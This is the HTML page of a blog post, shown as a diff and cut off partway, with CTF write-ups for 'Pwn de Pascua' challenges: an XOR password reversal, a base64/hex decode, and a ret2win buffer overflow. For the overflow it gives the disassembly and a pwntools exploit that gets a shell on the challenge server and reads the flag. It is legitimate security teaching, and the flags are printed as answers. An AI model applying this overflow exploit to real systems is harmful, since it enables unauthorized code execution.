@@ -1,0 +1,990 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  <meta http-equiv="content-language" content="en-us" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+
+  
+  
+  <title>PWN de Pascua Writeups &middot; </title>
+  <meta name="title" content="PWN de Pascua Writeups &middot; " />
+  
+
+  
+  
+  <meta name="description" content="Writeups of the CTF “Pwn de Pascua” challenges organized by Q4 Hacking Sessions" />
+  
+  
+  <link rel="canonical" href="http://localhost:1313/writeups/mini-q4-writeups/" />
+
+  
+
+  
+    
+        <link rel="stylesheet" href="/css/theme.css">
+    
+  
+    
+        <link rel="stylesheet" href="/css/main.css">
+    
+  
+    
+  
+
+
+  
+
+
+  
+
+
+
+  
+
+
+
+  
+    
+        <script src="/js/theme.js"></script>
+      
+    
+  
+
+  
+    
+        <script src="/js/codecopy.js"></script>
+      
+    
+  
+
+  
+    
+        <script src="/js/search.js"></script>
+      
+    
+  
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+
+  <meta property="og:url" content="http://localhost:1313/writeups/mini-q4-writeups/">
+  <meta property="og:title" content="PWN de Pascua Writeups">
+  <meta property="og:description" content="Writeups of the CTF “Pwn de Pascua” challenges organized by Q4 Hacking Sessions">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+
+  
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="PWN de Pascua Writeups">
+  <meta name="twitter:description" content="Writeups of the CTF “Pwn de Pascua” challenges organized by Q4 Hacking Sessions">
+
+  
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script
+      defer
+      type="text/javascript"
+      src="/lib/fuse/fuse.min.1ab2783fdcab6ba75fb69e4ed1e68a14a4b8721d45627d7147f5421d020c24ed4b36a70a8639009001131d8a04f3515f87706308931603f0194983f9db58f114.js"
+      integrity="sha512-GrJ4P9yra6dftp5O0eaKFKS4ch1FYn1xR/VCHQIMJO1LNqcKhjkAkAETHYoE81Ffh3BjCJMWA/AZSYP521jxFA=="
+    ></script>
+  
+
+
+
+  
+  
+
+
+  
+  
+  
+  
+  
+
+  
+  
+  
+    <link rel="preload" href="http://localhost:1313/fonts/Ubuntu-Regular.woff2" as="font" type="font/woff2" crossorigin>
+  
+
+  
+
+  
+
+</head>
+
+  <body>
+    <script>
+      const siteTheme = "auto";
+      let savedTheme = localStorage.getItem('theme') || siteTheme;
+      if (savedTheme == 'auto') {
+        if ( window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ) {
+          savedTheme = 'dark';
+        }
+      }
+      if (savedTheme === "dark") {
+        document.body.classList.add('dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    </script>
+    <div class="content">
+      <header>
+    
+    <div class="header-cntr">
+    <a class="title" href="/">
+    <span></span>
+    </a>
+  <div class="menu">
+  <nav id="main-menu" class="mm-normal">
+    <ul>
+    <li> <button id="mob-x-icon" class="menu-btn" arial-label="x-icon"> 
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+
+ </button> </li>
+    
+      <li><a href="/writeups/" aria-label="writeups">
+      writeups</li></a>
+    
+    </ul>
+  </nav>
+    <div class="side-menu">
+    
+<button id="search-open" class="menu-btn" aria-label="Search button">
+  
+
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+
+
+</button>
+
+<div id="search-container" data-url="http://localhost:1313/">
+  <div class="search">
+    <div class="panel">
+      <form>
+        
+
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+
+
+        <input type="search" id="search-query" placeholder="Search" tabindex=0 autocomplete="off"/>
+        <button id="search-close" title="Cancel (ESC)">
+          
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+
+
+        </button>
+      </form>
+    </div>
+    <ul id="search-results">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+    </ul>
+  </div>
+</div>
+
+    
+    <button id="theme-switcher" class="menu-btn" aria-label="Theme switcher">
+      <div id="moon">
+      
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+
+
+      </div>
+      <div id="sun">
+      
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+
+
+      </div>
+    </button>
+    
+    </div>
+    <button id="mob-hb-icon" class="menu-btn" aria-label="Hamburger icon">
+      
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+
+
+    </button>
+  </div>
+  <script>
+  (function() {
+    document.addEventListener('DOMContentLoaded', function() {
+    const openBtn = document.getElementById('mob-hb-icon');
+    const closeBtn = document.getElementById('mob-x-icon');
+    const mainMenu = document.getElementById('main-menu');
+    const body = document.body;
+
+    openBtn.addEventListener('click', function() {
+        mainMenu.classList.replace('mm-normal', 'mm-mobile-open');
+        closeBtn.style.display = 'block';
+        body.style.overflow = 'hidden';
+    });
+    closeBtn.addEventListener('click', function() {
+        mainMenu.classList.replace('mm-mobile-open', 'mm-normal');
+        closeBtn.style.display = 'none';
+        body.style.overflow = '';
+    });
+    })
+  })();
+  </script>
+  
+  <script>
+  (function() {
+    var mainmenu = document.getElementById('main-menu');
+    if (!mainmenu) return;
+
+    var path = window.location.pathname;
+    var links = mainmenu.querySelectorAll('a');
+
+    links.forEach(function(link) {
+      if (link.getAttribute('href') === path) {
+        link.classList.add('active');
+      }
+    });
+  })();
+  </script>
+  
+</div>
+</header>
+
+      <main>
+        
+
+
+
+
+
+
+
+<h1 class="pg-title">PWN de Pascua Writeups</h1>
+
+
+<div class="meta">
+  
+
+
+
+<p>
+
+
+  
+  
+  <span class="meta-icon">
+
+    <?xml version="1.0" encoding="utf-8"?><!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
+<svg fill="currentColor" width="800px" height="800px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19,4H17V3a1,1,0,0,0-2,0V4H9V3A1,1,0,0,0,7,3V4H5A3,3,0,0,0,2,7V19a3,3,0,0,0,3,3H19a3,3,0,0,0,3-3V7A3,3,0,0,0,19,4Zm1,15a1,1,0,0,1-1,1H5a1,1,0,0,1-1-1V12H20Zm0-9H4V7A1,1,0,0,1,5,6H7V7A1,1,0,0,0,9,7V6h6V7a1,1,0,0,0,2,0V6h2a1,1,0,0,1,1,1Z"/></svg>
+
+
+</span>
+  Posted on <time datetime="0001-01-01T00:00:00&#43;00:00">Jan 1, 0001</time>
+  
+  
+  
+
+
+  <span class="meta-icon">
+
+    <?xml version="1.0" encoding="utf-8"?><!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
+<svg width="800px" height="800px" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+<path d="M23 12C23 18.0751 18.0751 23 12 23C5.92487 23 1 18.0751 1 12C1 5.92487 5.92487 1 12 1C18.0751 1 23 5.92487 23 12ZM3.00683 12C3.00683 16.9668 7.03321 20.9932 12 20.9932C16.9668 20.9932 20.9932 16.9668 20.9932 12C20.9932 7.03321 16.9668 3.00683 12 3.00683C7.03321 3.00683 3.00683 7.03321 3.00683 12Z" fill="currentColor"/>
+<path d="M12 5C11.4477 5 11 5.44771 11 6V12.4667C11 12.4667 11 12.7274 11.1267 12.9235C11.2115 13.0898 11.3437 13.2343 11.5174 13.3346L16.1372 16.0019C16.6155 16.278 17.2271 16.1141 17.5032 15.6358C17.7793 15.1575 17.6155 14.5459 17.1372 14.2698L13 11.8812V6C13 5.44772 12.5523 5 12 5Z" fill="currentColor"/>
+</svg>
+
+
+</span>
+  
+    7 mins
+  
+
+
+</p>
+
+  
+
+
+</div>
+
+
+
+
+  <div class="toc">
+    <details >
+      <summary accesskey="c" title="(Alt+C)">
+        Table of Contents
+      </summary>
+      <div class="toc-innr">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#principiante">principiante</a>
+      <ul>
+        <li><a href="#aprendere">AprendeRE</a></li>
+        <li><a href="#ret2pwn">ret2pwn</a></li>
+        <li><a href="#just-decode-it">Just Decode it!</a></li>
+        <li><a href="#borrado">Borrado</a></li>
+        <li><a href="#alive">Alive</a></li>
+      </ul>
+    </li>
+    <li><a href="#web">web</a>
+      <ul>
+        <li><a href="#al-choque">Al choque!</a></li>
+        <li><a href="#el_fr33st4lero">El_Fr33st4lero</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto">crypto</a>
+      <ul>
+        <li><a href="#babycrypto">babycrypto</a></li>
+        <li><a href="#minicrypto">miniCrypto</a></li>
+      </ul>
+    </li>
+    <li><a href="#forense">forense</a>
+      <ul>
+        <li><a href="#volando">Volando</a></li>
+      </ul>
+    </li>
+    <li><a href="#jail">jail</a>
+      <ul>
+        <li><a href="#la-cana">La Cana</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      </div>
+    </details>
+  </div>
+  
+
+
+
+<p>In this post I will share the solutions to the challenges I solved in the &ldquo;Pwn de pascua&rdquo; CTF, played on December 20, 2024. I am pleased to announce that I got the first place in this event, which fills me with satisfaction and motivation.</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <img loading="lazy" src="https://i.imgur.com/00wdeOq.jpeg" alt="" />
+
+
+
+</p>
+<p>Below, I will explain the approaches and techniques I used to solve each of the challenges presented.</p>
+
+<h2 id="principiante">
+  principiante
+  
+  <a hidden class="anchor" href="#principiante">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h2>
+
+<h3 id="aprendere">
+  AprendeRE
+  
+  <a hidden class="anchor" href="#aprendere">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h3>
+<p>We are given a binary that we must reverse, analyzing its functions we see that the function <code>check_password()</code> performs an xor with the string <code>wl]qkorng]PG##=#</code>, by performing the reverse we can get the password and solve the challenge.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;wl]qkorng]PG##=#&#34;</span>
+</span></span><span style="display:flex;"><span>password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(chr(ord(char) <span style="color:#f92672">^</span> <span style="color:#ae81ff">2</span>) <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> target)
+</span></span><span style="display:flex;"><span>print(password)
+</span></span></code></pre></div><p>When we execute it we obtain the password that corresponds to the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> python3 solve<span style="color:#f92672">.</span>py
+</span></span><span style="display:flex;"><span>un_simple_RE<span style="color:#960050;background-color:#1e0010">!!?!</span>
+</span></span></code></pre></div>
+<h3 id="ret2pwn">
+  ret2pwn
+  
+  <a hidden class="anchor" href="#ret2pwn">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h3>
+<p>This challenge is the typical <code>ret2win</code> challenge, we are given a binary vulnerable to <em>Buffer Overflow</em> with a <code>win()</code> function which returns a shell. The binary in its <code>main()</code> function calls the <code>vuln()</code> function.</p>
+<pre><font color="#DC322F"><b>gef➤  </b></font>disass main
+Dump of assembler code for function <font color="#B58900">main</font>:
+   <font color="#268BD2">0x0000000000401240</font> &lt;+0&gt;:	<font color="#859900">endbr64</font>
+   <font color="#268BD2">0x0000000000401244</font> &lt;+4&gt;:	<font color="#859900">push   </font><font color="#DC322F">rbp</font>
+   <font color="#268BD2">0x0000000000401245</font> &lt;+5&gt;:	<font color="#859900">mov    </font><font color="#DC322F">rbp</font>,<font color="#DC322F">rsp</font>
+   <font color="#268BD2">0x0000000000401248</font> &lt;+8&gt;:	<font color="#859900">mov    </font><font color="#DC322F">eax</font>,<font color="#268BD2">0x0</font>
+   <font color="#268BD2">0x000000000040124d</font> &lt;+13&gt;:	<font color="#859900">call   </font><font color="#268BD2">0x401196</font> &lt;<font color="#B58900">setup</font>&gt;
+   <font color="#268BD2">0x0000000000401252</font> &lt;+18&gt;:	<font color="#859900">mov    </font><font color="#DC322F">eax</font>,<font color="#268BD2">0x0</font>
+   <font color="#268BD2">0x0000000000401257</font> &lt;+23&gt;:	<font color="#859900">call   </font><font color="#268BD2">0x4011f7</font> &lt;<font color="#B58900">vuln</font>&gt;
+   <font color="#268BD2">0x000000000040125c</font> &lt;+28&gt;:	<font color="#859900">mov    </font><font color="#DC322F">eax</font>,<font color="#268BD2">0x0</font>
+   <font color="#268BD2">0x0000000000401261</font> &lt;+33&gt;:	<font color="#859900">pop    </font><font color="#DC322F">rbp</font>
+   <font color="#268BD2">0x0000000000401262</font> &lt;+34&gt;:	<font color="#859900">ret</font>
+End of assembler dump.
+</pre>
+<p>The <code>vuln()</code> function is vulnerable to <em>Buffer Overflow</em> since it defines a buffer of 256 bytes in size and reads up to 512 bytes, giving us room to overflow the stack.</p>
+<pre><font color="#DC322F"><b>gef➤  </b></font>disass vuln
+Dump of assembler code for function <font color="#B58900">vuln</font>:
+   <font color="#268BD2">0x00000000004011f7</font> &lt;+0&gt;:	<font color="#859900">endbr64</font>
+   <font color="#268BD2">0x00000000004011fb</font> &lt;+4&gt;:	<font color="#859900">push   </font><font color="#DC322F">rbp</font>
+   <font color="#268BD2">0x00000000004011fc</font> &lt;+5&gt;:	<font color="#859900">mov    </font><font color="#DC322F">rbp</font>,<font color="#DC322F">rsp</font>
+   <font color="#268BD2">0x00000000004011ff</font> &lt;+8&gt;:	<font color="#859900">sub    </font><font color="#DC322F">rsp</font>,<font color="#268BD2">0x100</font>
+   <font color="#268BD2">0x0000000000401206</font> &lt;+15&gt;:	<font color="#859900">lea    </font><font color="#DC322F">rax</font>,[<font color="#DC322F">rip</font>+<font color="#268BD2">0xdff</font>]<font color="#9F9B8E">        # 0x40200c</font>
+   <font color="#268BD2">0x000000000040120d</font> &lt;+22&gt;:	<font color="#859900">mov    </font><font color="#DC322F">rdi</font>,<font color="#DC322F">rax</font>
+   <font color="#268BD2">0x0000000000401210</font> &lt;+25&gt;:	<font color="#859900">call   </font><font color="#268BD2">0x401070</font> &lt;<font color="#B58900">puts@plt</font>&gt;
+   <font color="#268BD2">0x0000000000401215</font> &lt;+30&gt;:	<font color="#859900">lea    </font><font color="#DC322F">rax</font>,[<font color="#DC322F">rbp</font><font color="#268BD2">-0x100</font>]
+   <font color="#268BD2">0x000000000040121c</font> &lt;+37&gt;:	<font color="#859900">mov    </font><font color="#DC322F">edx</font>,<font color="#268BD2">0x200</font>
+   <font color="#268BD2">0x0000000000401221</font> &lt;+42&gt;:	<font color="#859900">mov    </font><font color="#DC322F">rsi</font>,<font color="#DC322F">rax</font>
+   <font color="#268BD2">0x0000000000401224</font> &lt;+45&gt;:	<font color="#859900">mov    </font><font color="#DC322F">edi</font>,<font color="#268BD2">0x0</font>
+   <font color="#268BD2">0x0000000000401229</font> &lt;+50&gt;:	<font color="#859900">call   </font><font color="#268BD2">0x401090</font> &lt;<font color="#B58900">read@plt</font>&gt;
+   <font color="#268BD2">0x000000000040122e</font> &lt;+55&gt;:	<font color="#859900">lea    </font><font color="#DC322F">rax</font>,[<font color="#DC322F">rip</font>+<font color="#268BD2">0xde3</font>]<font color="#9F9B8E">        # 0x402018</font>
+   <font color="#268BD2">0x0000000000401235</font> &lt;+62&gt;:	<font color="#859900">mov    </font><font color="#DC322F">rdi</font>,<font color="#DC322F">rax</font>
+   <font color="#268BD2">0x0000000000401238</font> &lt;+65&gt;:	<font color="#859900">call   </font><font color="#268BD2">0x401070</font> &lt;<font color="#B58900">puts@plt</font>&gt;
+   <font color="#268BD2">0x000000000040123d</font> &lt;+70&gt;:	<font color="#859900">nop</font>
+   <font color="#268BD2">0x000000000040123e</font> &lt;+71&gt;:	<font color="#859900">leave</font>
+   <font color="#268BD2">0x000000000040123f</font> &lt;+72&gt;:	<font color="#859900">ret</font>
+End of assembler dump.</pre>
+<p>To sum up:</p>
+<ul>
+<li>We must exploit the <em>Buffer Overflow</em> until we overflow the stack.</li>
+<li>Once the stack is overflowed we must align the stack with a RET gadget (we use <code>ROPgadget</code> for this).</li>
+<li>We pass the memory address of the <code>win()</code> function and get a shell.</li>
+</ul>
+<p>With this exploit we solve the challenge.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;0.cloud.chals.io&#39;</span>, <span style="color:#ae81ff">23438</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">264</span>
+</span></span><span style="display:flex;"><span>junk <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> offset
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> junk                          <span style="color:#75715e"># padding</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x000000000040101a</span>)      <span style="color:#75715e"># ret</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00000000004011dd</span>)      <span style="color:#75715e"># win()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>When executed, it returns a shell.</p>
+<pre>$ python3 solve.py 
+[<font color="#859900"><b>+</b></font>] Opening connection to 0.cloud.chals.io on port 23438: Done
+[<font color="#268BD2"><b>*</b></font>] Switching to interactive mode
+A donde? : 
+
+ok, let&apos;s go!
+
+<font color="#DC322F"><b>$</b></font> ls
+flag.txt
+ret2pwn
+<font color="#DC322F"><b>$</b></font> cat flag.txt
+q4{un_simple_ret2pwn_para_apr3nder!}</pre>
+
+<h3 id="just-decode-it">
+  Just Decode it!
+  
+  <a hidden class="anchor" href="#just-decode-it">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h3>
+<p>We are given a string encoded in base64, we decode it and see that it is in hexadecimal, decode it again and get the flag, use Cyberchef for this.</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <img loading="lazy" src="https://i.imgur.com/EMPXtA2.png" alt="" />
+
+
+
+</p>
+
+<h3 id="borrado">
+  Borrado
+  
+  <a hidden class="anchor" href="#borrado">
+
